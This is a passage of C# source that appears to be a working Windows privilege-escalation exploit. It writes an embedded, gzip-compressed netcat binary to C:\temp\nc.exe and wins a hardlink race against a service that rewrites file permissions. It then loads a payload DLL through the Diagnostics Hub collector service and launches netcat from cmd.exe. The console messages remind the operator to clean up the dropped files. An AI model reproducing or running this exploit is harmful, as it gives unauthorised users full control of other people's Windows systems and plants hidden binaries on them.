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"));
            File.WriteAllBytes($@"C:\temp\nc.exe", nc);

            bool fc = false;
            FileSecurity acl = CheckFilePermission(path);


            WindowsPrincipal self = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            string user = self.Identity.Name;

            foreach (FileSystemAccessRule rule in acl.GetAccessRules(true, true, typeof(NTAccount)))
            {
                if (rule.IdentityReference.Value.Equals(user) & rule.FileSystemRights.Equals(FileSystemRights.FullControl))
                    fc = true;
            }

            if (fc)
            {
                Console.WriteLine($@"[+] {WindowsIdentity.GetCurrent().Name} already has Full Control of {path}");
                CollectorService.DLL.Load(filename);
                System.Threading.Thread.Sleep(2000);
                string strCmdPopp = @" /C C:\temp\nc.exe 127.0.0.1 2000";
                System.Diagnostics.Process.Start("CMD.exe", strCmdPopp);

                System.Threading.Thread.Sleep(2000);
                Console.WriteLine(@" [x] {0} Dont forget to clean up license.rtf & C:\temp\nc.exe");
                return;
            }


                        
            IntPtr Thread = GetCurrentThread();
            SetThreadPriority(Thread, ThreadPriority.THREAD_PRIORITY_HIGHEST);

            NtFile ntFile;
            ntFile = NtFile.Open($@"\??\{path}", null, FileAccessRights.MaximumAllowed);

            Console.WriteLine("[+] Waiting to Create Hardlink");

            bool Failed = true;
            Console.WriteLine(@" [>] Starting race condition.");
            while (Failed)
            {
                try
                {

                    ntFile.CreateHardlink($@"\??\{LocalState}\rs.txt");
                    Failed = false;

                }

                catch { }
            }

            Console.WriteLine($"[+] Created Hardlink to {path}");



            // Give the service some time to rewrite DACLs
            System.Threading.Thread.Sleep(2000);

            fc = false;

            foreach (FileSystemAccessRule rule in acl.GetAccessRules(true, true, typeof(NTAccount)))
            {
                if (rule.IdentityReference.Value.Equals(user) & rule.FileSystemRights.Equals(FileSystemRights.FullControl))
                    fc = true;
            }

            if (fc)
            {
                Console.WriteLine(@"[+] You have Full Control");

                CollectorService.DLL.Load(filename);

                string strCmdPopp = @" /C C:\temp\nc.exe 127.0.0.1 2000";
                System.Diagnostics.Process.Start("CMD.exe", strCmdPopp);

                System.Threading.Thread.Sleep(2000);
                Console.WriteLine(@" [x] {0} Dont forget to clean up license.rtf & C:\temp\nc.exe");

            }

            else
            {
                Console.WriteLine(@"[+] Unlucky - Try again");
            }



        }
        private static void KillEdge()
        {
            Process[] edge = Process.GetProcessesByName(@"MicrosoftEdge");
            foreach (Process proc in edge)
            {
                try { proc.Kill(); } catch { }

            }
        }

        
        private static FileSecurity CheckFilePermission(string path)
        {
            FileInfo file = new FileInfo(path);
            FileSecurity acl = file.GetAccessControl();
            return acl;
        }
        public static int GetCortana()
        {

            string KeyName = @"SOFTWARE\Policies\Microsoft\Windows\Windows Search";
            string ValueName = "AllowCortana";

            using (var key = Registry.LocalMachine.OpenSubKey(KeyName))
            {
                return (int)(key?.GetValue(ValueName) ?? -1);
            }
        }

        public static byte[] DecompressFile(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        public enum ThreadPriority
        {
            THREAD_PRIORITY_HIGHEST = 2
        }
    }
}
